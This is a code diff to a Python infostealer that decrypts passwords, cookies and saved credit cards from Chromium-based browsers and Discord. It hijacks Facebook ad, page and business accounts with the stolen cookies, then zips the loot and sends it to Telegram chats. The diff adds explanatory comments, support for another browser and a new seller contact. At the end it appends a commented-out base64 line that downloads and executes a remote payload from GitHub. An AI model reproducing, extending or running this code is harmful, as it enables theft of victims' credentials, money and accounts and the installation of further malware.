@@ -1,4 +1,3 @@
-
 import sys
 sys.path.append(r'C:\\Users\\hi\\Downloads\\Env\\Lib\\site-packages')
 
@@ -27,7 +26,7 @@ CHAT_ID_RESET = "-4516122864"
 browsers = []
 creation_datetime = datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')
 
-ch_dc_browsers = {
+ch_dc_browsers = {   #Danh sách các trình duyệt (Google Chrome, Brave, Edge, Opera,...) và đường dẫn tương ứng tới nơi lưu trữ dữ liệu người dùng của chúng
 	"Chromium": f"{LocalAppData}\\Chromium\\User Data",
 	"Thorium": f"{LocalAppData}\\Thorium\\User Data",
 	"Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
@@ -74,14 +73,14 @@ ch_dc_browsers = {
     "Discord PTB": f'{AppData}\\discordptb'
 }
 
-def installed_ch_dc_browsers():
+def installed_ch_dc_browsers(): #Kiểm tra những trình duyệt nào có sẵn trên hệ thống bằng cách kiểm tra sự tồn tại của các thư mục User Data
     results = []
     for browser, path in ch_dc_browsers.items():
         if os.path.exists(path):
             results.append(browser)
     return results
 
-def get_ch_master_key(path):
+def get_ch_master_key(path): #Lấy Master Key từ dữ liệu Local State của trình duyệt, dùng để giải mã dữ liệu đã mã hóa của người dùng.
     try:
         with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
             c = f.read()
@@ -98,7 +97,7 @@ def get_ch_master_key(path):
     except:
         return None
 
-def decrypt_ch_value(buff, ch_master_key=None):
+def decrypt_ch_value(buff, ch_master_key=None): #Giải mã giá trị mật khẩu đã lưu từ trình duyệt. Hàm này sử dụng AES.MODE_GCM để giải mã, yêu cầu ch_master_key
     try:
         starts = buff.decode(encoding="utf-8", errors="ignore")[:3]
         if starts == "v10" or starts == "v11":
@@ -195,7 +194,7 @@ class Facebook():
         headers = {'authority': 'adsmanager.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','viewport-width': '794'}
         self.rq.headers.update(headers)
         self.rq.cookies.update(cookies)
-        self.token = self.Get_Market()
+        self.token = self.Get_Market()  #lấy tokenaccess để thao tác trên tkqc
         if self.token == False:
             return None
         else:
@@ -212,7 +211,7 @@ class Facebook():
                     cookies[key] = value
         return cookies
 
-    def Get_Market(self):
+    def Get_Market(self): #lấy tokenaccess để thao tác trên tkqc
         try:
             act = self.rq.get('https://adsmanager.facebook.com/adsmanager/manage')
             list_data = act.text
@@ -265,7 +264,7 @@ class Facebook():
             return datax
         except:return 'Không Có TKQC'
         
-    def Get_Page(self):
+    def Get_Page(self):  #lấy thông tin pages mà tài khoản đang quản trị
         try:
             List_Page = f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name%2Clink%2Cfan_count%2Cfollowers_count%2Cverification_status&access_token={self.token}"
             data = self.rq.get(List_Page)    
@@ -284,7 +283,7 @@ class Facebook():
                 return "Page: 0"
         except:pass
 
-    def Get_QTV_Gr(self):
+    def Get_QTV_Gr(self): #lấy thông tin của group mà tài khoản đang quản trị
         try:
             get_group = f"https://graph.facebook.com/v17.0/me/groups?fields=administrator,member_count&limits=1500&access_token={self.token}"
             list_group = self.rq.get(get_group).text
@@ -298,7 +297,7 @@ class Facebook():
             return ids
         except:return 'QTV Group : 0'
     
-    def Get_id_BM(self):
+    def Get_id_BM(self):   
         List_BM = f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={self.token}"
         data = self.rq.get(List_BM)
         try:
@@ -462,7 +461,7 @@ def get_gck_profiles(basepath):
 
     return profiles
 
-def get_ch_login_data(browser, path, profile, ch_master_key):
+def get_ch_login_data(browser, path, profile, ch_master_key): #hàm này thu thập thông tin đăng nhập được lưu trữ trong cơ sở dữ liệu của trình duyệt, sau đó giải mã bằng ch_master_key.
     result = ""
     count = 0
     if not os.path.exists(f"{path}\\{profile}\\Login Data"):
@@ -489,7 +488,7 @@ def get_ch_login_data(browser, path, profile, ch_master_key):
     os.remove(TMP + "\\login_db")
     return count
 
-def get_ch_cookies(browser, path, profile, ch_master_key):
+def get_ch_cookies(browser, path, profile, ch_master_key): #hàm này thu thập thông tin cookie được lưu trữ trong cơ sở dữ liệu của trình duyệt, sau đó giải mã bằng ch_master_key.
     count = 0
     result = ""
     fb_result = []
@@ -513,6 +512,10 @@ def get_ch_cookies(browser, path, profile, ch_master_key):
         "Vivaldi": {
             "executable": "vivaldi.exe",
             "path": "C:/Program Files/Vivaldi/Application/vivaldi.exe"
+        },
+        "CocCoc": {
+            "executable": "browser.exe",
+            "path": "C:/Program Files/CocCoc/Browser/Application/browser.exe"
         }
     }
     if browser in browser_data:
@@ -617,7 +620,7 @@ def save_gck_cookies(profiles, profile_name, browser_name):
     return count
 
 
-def get_ch_ccards(browser, path, profile, ch_master_key):
+def get_ch_ccards(browser, path, profile, ch_master_key): #ham nay thu thu thong tin the tin dung duoc luu tru trong co so du lieu cua trinh duyet, sau do giai ma bang ch_master_key.
     result = ""
     count = 0
 
@@ -742,7 +745,7 @@ zip_data = io.BytesIO()
 archive_path = os.path.join(TMP, f"[{CountryCode}_{SEIP}] {os.getenv('COMPUTERNAME', 'defaultValue')}.zip")
 
 with zipfile.ZipFile(zip_data, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
-    zip_file.comment = f"Time Created: {creation_datetime}\nContact: https://t.me/Xmeta".encode()
+    zip_file.comment = f"Time Created: {creation_datetime}\nContact: https://t.me/muabanuytinde".encode()
 
     for root, _, files in os.walk(Data_Path):
         for name in files:
@@ -762,9 +765,9 @@ message_body = f"{GetIPD}\nUser: {os.getlogin()}\nBrowser Data: CK: {total_brows
 
 for i in range(10):
     if Count == 1:
-        CHAT_ID = CHAT_ID_NEW #Sv Data Mới
+        CHAT_ID = CHAT_ID_NEW #Sv Data moi
     else:
-        CHAT_ID = CHAT_ID_RESET #Sv Data Update (Send từ lần 2)
+        CHAT_ID = CHAT_ID_RESET #Sv Data Update (Send tu lan 2)
 
     try:
         with open(archive_path, "rb") as f:
@@ -783,4 +786,7 @@ shutil.rmtree(Data_Path, ignore_errors=True)
 
 if os.path.exists(archive_path):
     os.remove(archive_path)
+    
+#exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2ltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9wb3NlaWRvbjEzMzgveC9yZWZzL2hlYWRzL21haW4veHdvcm1fRU5DJykucmVhZCgpLmRlY29kZSgndXRmLTgnKSkp'))
+
     
